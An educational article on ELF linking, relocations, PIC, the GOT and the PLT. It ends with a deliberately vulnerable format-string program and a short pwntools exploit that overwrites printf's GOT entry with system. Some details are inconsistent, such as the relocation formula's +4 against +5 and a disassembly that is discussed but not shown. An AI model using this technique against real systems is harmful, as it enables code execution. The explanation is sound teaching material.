== [ Introduction ] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

To transform our code into an executable, the compiler will undergo four
steps:

0. Preprocessing
1. Compiling
2. Assembling
3. Linking

As we're interested in relocations, we are going to focus on the linking stage
but feel free to investigate the other steps.

The job of the linker is "simple": bind abstract names to concrete names.

You'll find it easier to understand with an example: A programmer can write
the name printf, and the linker will bind it to "the location X from the
beginning of the executable code in stdio". This way, the programmer doesn't
need to worry about where in memory printf is located, as was the case in
earlier times when programmers had to know the exact addresses of functions.

The linker receives input files, each of which contains segments that are just
chunks of code or data to be placed in the output file. Each of these files
also has at least one symbol table.

When the linker runs, it scans the input files to find the sizes of the
segments and to collect the definitions and references of all the symbols.
It creates a segment table as well as a symbol table.

Using this data, the linker determines the address at which the symbol will
be assigned, adjusts the memory addresses in the code and data segments, and
writes the relocated code to the output file. It is normal for this output
file to contain a symbol table for relinking or debugging.

Let's see a quick example:

~ . ~ . ~ . ~ . ~ . ~ .
: main.c:             :
:                     :
: #include "sum.h"    :
:                     :
: int main(){         :
:                     :
:   sum(1,2);         :
:   return 0;         :
: }                   :
~ . ~ . ~ . ~ . ~ . ~ .

~ . ~ . ~ . ~ . ~ . ~ . ~ . ~
: sum.c:                    :
:                           :
: int sum(int a, int b){    :
:                           :
:  return a+b;              :
: }                         :
~ . ~ . ~ . ~ . ~ . ~ . ~ . ~

We call sum() from main.c, which causes a relocation in main.c. If we
compile this main.c, we are left with an object file, main.o, of type
ET_REL. If we check the disassembly of this object file, we can see:


~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .
: $ objdump -d main.o                                           :
:                                                               :
: main.o:     file format elf32-i386                            :
:                                                               :
: Disassembly of section .text:                                 :

: 00000000 &lt;main&gt;:                                              :
:   ~ [Shortened output]                                        :
:                                                               :
:  18:   e8 fc ff ff ff          call   19 &lt;main+0x19&gt;          :
:  1d:   83 c4 10                add    esp,0x10                :
:  20:   b8 00 00 00 00          mov    eax,0x0                 :
:  25:   8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4] :
:  28:   c9                      leave                          :
:  29:   8d 61 fc                lea    esp,[ecx-0x4]           :
:  2c:   c3                      ret                            :
~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .


At the address 0x18 there is supposed to be a call to sum(),but there is a
call to 0x19? and the instruction argument is "fcffffff". Weird, right?

The call to 0x19 exists because the assembler places a temporary value, in
this case -4, since we are using a call instruction (relative addressing).
When the call instruction at 0x18 is executed, the EIP will point to the next
instruction, which is at 0x1D. By subtracting the temporary value from the
EIP (0x1D - 4), we get 0x19, which corresponds to the offset of the unresolved
symbol. This temporary value will later be replaced by the linker with the
correct relative address once the symbol is resolved.

Let's examine the relocations using readelf to see what's happening here.

~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .
: Relocation section '.rel.text' at offset 0x160 contains 1 entry:      :
: Offset     Info    Type            Sym.Value  Sym. Name               :
: 00000019  00000402 R_386_PC32        00000000   sum                   :
~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .

We see that there is a relocation at offset 0x19, which corresponds to the
argument of the instruction at address 0x18.
The type of relocation is R_386_PC32, which indicates that relative addressing
is being used (because it is a call). The linker will resolve the address of
the symbol sum (for example, 0x08049183) and calculate the relative address.

Assuming the call instruction is located at 804916e,
the linker will calculate the relative address using the following formula:

  Relative address = Target address − (Instruction address+4)

Applying the formula:

  0x08049183 - (804916e+5) = 0x10

(Note that we are adding 5 because the call instruction calculates the
relative address with respect to the address immediately after the
instruction, not from the instruction's starting address.)

Let's see if the relative address we've calculated makes sense.
Take a look at the previous object file disassembly and look now to the
disassembled linked file:

~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .
: 08049156 &lt;main&gt;:                                                  :
: ~ [Shorted output]                                                :
:                                                                   :
: 804916e:       e8 10 00 00 00          call   8049183 &lt;sum&gt;       :
: 8049173:       83 c4 10                add    $0x10,%esp          :
: 8049176:       b8 00 00 00 00          mov    $0x0,%eax           :
: 804917b:       8b 4d fc                mov    -0x4(%ebp),%ecx     :
: 804917e:       c9                      leave                      :
: 804917f:       8d 61 fc                lea    -0x4(%ecx),%esp     :
: 8049182:       c3                      ret                        :
:                                                                   :
: 08049183 &lt;sum&gt;:                                                   :
:  8049183:       55                      push   %ebp               :
~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .

If you have a look at the address 804916e you can see that the argument of
the call function is the value "0x10", which corresponds with what we've
calculated before.


== [ Static Linking VS Dynamic Linking ] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Static linking involves copying all dependencies directly into the final
executable. This means that the executable includes both our code and the code
of any libraries it uses, resulting in a standalone binary that doesn’t rely
on external libraries at runtime. While this approach increases the file size,
it also ensures the binary can run independently.

In dynamic linking, however, we only include references to external libraries
as unresolved symbols in the executable. These symbols are resolved at runtime
using the Global Offset Table and, often, the Procedure Linkage Table.
This approach keeps the executable smaller and allows for easier updates
and bug fixes to libraries, as they can be modified independently
of the executable.

== [ Understanding ELF Relocations ] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The ELF sections hold the bulk information of the object file for the linking
process: instructions, data, relocation, etc.

As you may know, there are lots of section types, but we're diving deep into
relocation-involved sections: `SHT_RELA` and `SHT_REL`.

SHT_RELA: This section holds relocation entries with an explicit addend.
This is the structure that every entry has:

~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~
: typedef struct {                                                           :
: Elf32_Addr  r_offset; //Gives the location of where to apply the relocation:
: Elf32_Word  r_info; //Symbol index for its symbol table and relocation type:
: Elf32_Sword r_addend; //Constant Value used for address calculation, or the:
:                         //final value used in r_offset.                    :
: } Elf32_Rela;                                                              :
~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~
For making up the r_info field, glibc does some bit operations for joining
both the index and relocation type. We can see this in the elf.h file:

~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~
: /* How to extract and insert information held in the r_info field.  */     :
:                                                                            :
: #define ELF32_R_SYM(val)          ((val) &gt;&gt; 8)                             :
: #define ELF32_R_TYPE(val)         ((val) & 0xff)                           :
: #define ELF32_R_INFO(sym, type)   (((sym) &lt;&lt; 8) + ((type) & 0xff))         :
:                                                                            :
: #define ELF64_R_SYM(i)            ((i) &gt;&gt; 32)                              :
: #define ELF64_R_TYPE(i)           ((i) & 0xffffffff)                       :
: #define ELF64_R_INFO(sym, type)   ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type)) :
~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~


SHT_REL: The same as SHT_RELA but without the addend:

~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .
: typedef struct {                    :
:      Elf32_Addr    r_offset;        :
:      Elf32_Word    r_info;          :
: } Elf32_Rela;                       :
~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .

Let's see how we can modify this structure for doing weird things to the elf ;)

~ . ~ . ~ . ~ . ~ . ~ .
: #include &lt;stdio.h&gt;  :
: int main(){         :
:                     :
:  puts("Hello");     :
:  putchar('a');      :
:  return 0;          :
: }                   :
~ . ~ . ~ . ~ . ~ . ~ .

Output:

~ . ~ . ~ . ~ . ~
: $ test ./main :
: Hello         :
: a%            :
~ . ~ . ~ . ~ . ~

For the first case, I'm going to modify the r_info member, so that it's the
same as the putchar entry.

~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~
: $ readelf -r main                                                          :
:                                                                            :
: Relocation section '.rel.plt' at offset 0x21b0 contains 3 entries:         :
:  Offset     Info    Type            Sym.Value  Sym. Name                   :
: 0804c000    107  R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.34 :
: 0804c004    207  R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0               :
: 0804c008    407  R_386_JUMP_SLOT   00000000   putchar@GLIBC_2.0            :
~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~


I've manually modified it with a hex editor, and so now we have:

~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~
: $ readelf -r main                                                          :
:                                                                            :
: Relocation section '.rel.plt' at offset 0x21b0 contains 3 entries:         :
: Offset     Info    Type            Sym.Value  Sym. Name                    :
: 0804c000    107 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.34  :
: 0804c004    407 R_386_JUMP_SLOT   00000000   putchar@GLIBC_2.0             :
: 0804c008    407 R_386_JUMP_SLOT   00000000   putchar@GLIBC_2.0             :
~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~


If we now execute the program again, this is our output:

~ . ~ . ~ . ~ . ~ . ~ .
: $ test ./main       :
: @a%                 :
~ . ~ . ~ . ~ . ~ . ~ .

You can clearly observe that "Hello" does not appear in the output. Instead,
the character "@" appears, which corresponds to the value 40. This value is
"random" because it is being picked from the stack. Specifically, it should be
the first byte of the address where the string "Hello" is located.

In this case, the value is 40 because the code was compiled for x86_64 (x86_64
linux addresses start with 0x040),which results in a more clear output.
If the code had been compiled for 32-bit, the output would be less clear, as
the value 08 (Starting byte of x86 addresses) would not correspond to a visible
ASCII character but to a backspace.

I thought that manually modifying these values was kind of boring, as you have
to find the value you want to modify, guess what value it is, etc.

So I decided to make a small program that does this work. You can find
it at the end of this article.


== [ Position Independent Code ] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

PIC was created to solve the load-time relocation inconveniences. Basically,
when we use shared libraries we are looking to use fewer computing resources,
but with load-time relocations, this is not possible as the text section is
(and should be) not writable. This means we cannot do runtime relocs.

Using load-time relocations, the .text section has to be modified to apply
the relocations, and so for each application that uses this shared library, we
will have a modified version of the .text in memory, so basically, we are not
really sharing the library.

One of the key insights on which PIC relies is the offset between the data and
text sections. This offset is known to the linker at link-time, when it
collects the sections of the different object code files. It knows the size
of every section in the file and their relative relocations.

The real hard work comes when we try to make this relative addressing work in
x86, as the data references need to be absolute (i.e., the mov instruction).

How do we go from a relative address to an absolute address?
There is no instruction for getting the EIP value, but we can do some tricks:

-------------------
|     call getEip |
| getEip:         |
|     pop ecx     |
-------------------

Instead of doing these kind of "tricks" every time we need to know EIP, we add
another layer of indirection. This layer is known as GOT.

== [ Global Offset Table ] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Basically, the GOT is a table that lives in the .data section. What we achieve
with the GOT is that we can refer relatively, and it contains the absolute
address of the data we want.

Suppose that an instruction needs an absolute address (like mov),
what this will do is simple: we refer to the GOT entry with a
relative address (which we know from linking).
The GOT entry in turn has the absolute address of our data.

By using the GOT, we get rid of the text relocation, but we get a data
relocation. How can this be better?

Well, relocations in the text section are per variable reference, while in the
GOT we just need one relocation for each variable.
The data section is writable and is not shared between processes, so adding
relocations to it doesn't do harm. Moving the relocations to the data makes
the code section read-only and shareable between processes.

In the address 0x1140, you can see that we get the address of the next
instruction into eax, as we've seen before in this article. In the address
0x1145 is a constant offset from the instruction to the place where the GOT
is located. Now EAX serves as a base pointer to the GOT.

In the address 0x114a, we are moving into eax a value from [eax-0x8], which
is a GOT entry. This is the address of the global variable `glob`. In the
address 0x1150, the value of `glob` is moved into edx.

Let's see if the constant offset that we add to eax is really the GOT address:

~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .~
: [Nr] Name           Type          Addr     Off    Size   ES Flg Lk Inf Al  :
: [20] .got           PROGBITS      003fdc   002fdc 000024 04  WA  0   0  4  :
~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .~


We see that the .got address is in `0x00003fdc`. As we know, the call to
`__x86.get_pc_thunk.bx` places the address of the next instruction into eax,
and that address is `0x10ed`.

If we add this address and the static offset we have, we are left with:
(0x1145 + 0x2e97 = 0x3FDC).

== [ Function calls with PIC ] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

So far we have seen the work of GOT with variables. What about functions?

Well, the same mechanism applies here. Instead of the call containing the
absolute address of the function, it will contain the address of the GOT entry

== [ Procedure Linkage Table] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When a shared library references a function, the real address of the function
is not known until load-time. As we've seen in the beginning of this article,
this is called binding.

This binding process is slow and non-trivial, as there are lots of symbol
resolutions. The loader has to actually look up the function symbol in special
hash tables defined in the sections of the ELF.

The majority of these resolutions are done in vain as we don't normally use 100%
of the functions our code has. In a typical run of a program only a fraction
of functions are actually used (think of special condition functions or error
handling functions).

To speed up this process, the lazy binding scheme was built-in. The operation
of this lazy binding is simple:

We don't resolve the symbols until we need to, once we solve the symbol we
save it as it’s supposed that you will call the same function more than once.

For implementing lazy binding, we need to add another layer of indirection:
The Procedure Linkage Table (PLT).

Let's see an example for better understanding:

1. When we refer to a function (func) in our code, the compiler translates the
   function as func@plt, which is an entry into the PLT table.

2. The first entry in the PLT is a special one, which contains the resolver
   routine, and the next entries are identically structured, one for each
   function needing resolution.

3. Each PLT entry except the first contains the following:
   - Jump location which is specified in the GOT Table.
   - Preparation of arguments for the resolver routine.
   - Call to the resolver routine (The first PLT entry).

4. Before the function address has been resolved, the N GOT entry contains the
   address of the PLT entry after the jump (the call to the resolver routine).


When func is called for the first time this is the mechanism applied:

1. PLT[n] is called and jumps to the address pointed to in GOT[n].
2. This address points to PLT[n] itself, to the argument preparation
   for the resolver.
3. We call the resolver.
4. The resolver performs the actual resolution for the func address,
   places it into the GOT[n] and calls func.

Once we are done with the func resolution, any call to func will not repeat
these steps, as we recorded the address into the GOT entry, instead of having
the address of the argument preparation, we now have the address of func.

For more clarity:

1. The PLT[n] is called and jumps to the address pointed in GOT[n]
2. GOT[n] now points to the func address, and we call to func and transfer
   control to it.

== [ GOT Overwriting ] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

So far we've seen that the GOT holds the address of the desired function. Have
you wondered what would happen if we can modify this address?

Well, we can redirect the code and probably gain command execution.

I am not the first to think about this, so obviously there exist some
protections for this such as RELRO, ASLR, and CFI, among others.

I'll compile this code with no security measures and with ASLR,
as I just want you to get the idea:

~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .
: #include &lt;stdio.h&gt;                              :
:                                                 :
: void vuln() {                                   :
:    char buffer[300];                            :
:                                                 :
:    while(1) {                                   :
:        fgets(buffer, sizeof(buffer), stdin);    :
:        printf(buffer);                          :
:                                                 :
:    }                                            :
: }                                               :
:                                                 :
: int main() {                                    :
:    vuln();                                      :
:    return 0;                                    :
: }                                               :
~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .

What we want to overwrite is the .got.plt section which contains the lazy
binding resolutions. Meanwhile, the .got section contains the eager binding
resolutions.

In this case we have a function with an infinite loop, which takes our input
and prints it using the printf function. It seems clear that this is a
classical format string exploitation.

Let's setup our exploit:

~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~
: from pwn import \*                                            :
:                                                               :
:  elf = context.binary = ELF("./got", checksec=False)          :
:                                                               :
:  libc = elf.libc                                              :
:  libc.address = 0xf7dab000                                    :
:                                                               :
:  p = process()                                                :
:                                                               :
~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~

Now we want to search where our arguments are in the stack.
For this I'll do the following:

~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ .
: $ ./got                                                                   :
:    %p %p %p %p %p %p %p %p                                                :
:    0x12c 0xf7fa45c0 0x40 0x10 0x25207025 0x70252070 0x20702520 0x25207025 :
~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ ~ . ~ . ~ .


As we can see, the fifth block contains the ascii values of our input.

Fine, now we know the offset where we want to put the reference that we need
to overwrite. I want to overwrite the printf got entry, so that each time
the program calls printf, it's going to resolve to 'system'.

~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .
: from pwn import *                                                       :
:                                                                         :
: elf  = context.binary = ELF("./got", checksec=False)                    :
:                                                                         :
: libc = elf.libc                                                         :
: libc.address = 0xf7dab000                                               :
:                                                                         :
: p = process()                                                           :
:                                                                         :
: payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})   :
: p.sendline(payload)                                                     :
: p.clean()                                                               :
: p.interactive()                                                         :
~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ . ~ .

After the execution of the exploit the GOT entry has been modified, and each
time the printf function is called, we are really calling system().

This was a very basic exploitation demonstration, but I hope it helps you
understand the GOT concept.

== [ Conclusion ] ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Relocations in ELF files are a critical aspect of the linking and execution
process, enabling code and data to be adjusted to the correct memory addresses
at load time. This process becomes even more essential when working with PIC,
which allows programs to be loaded at varying memory addresses, enhancing
flexibility and security.

The use of the Global Offset Table (GOT) and the Procedure Linkage Table (PLT)
is key to supporting dynamic function execution and resolving symbols in
programs that rely on shared libraries. The GOT stores addresses of external
functions and variables, while the PLT serves as an intermediary for function
address resolution during runtime, optimizing the dynamic linking process.

Together, these mechanisms not only enable more efficient and flexible program
execution but are also crucial for implementing security features like Address
Space Layout Randomization (ASLR), which enhances protection against buffer
overflow attacks and other exploit vectors.
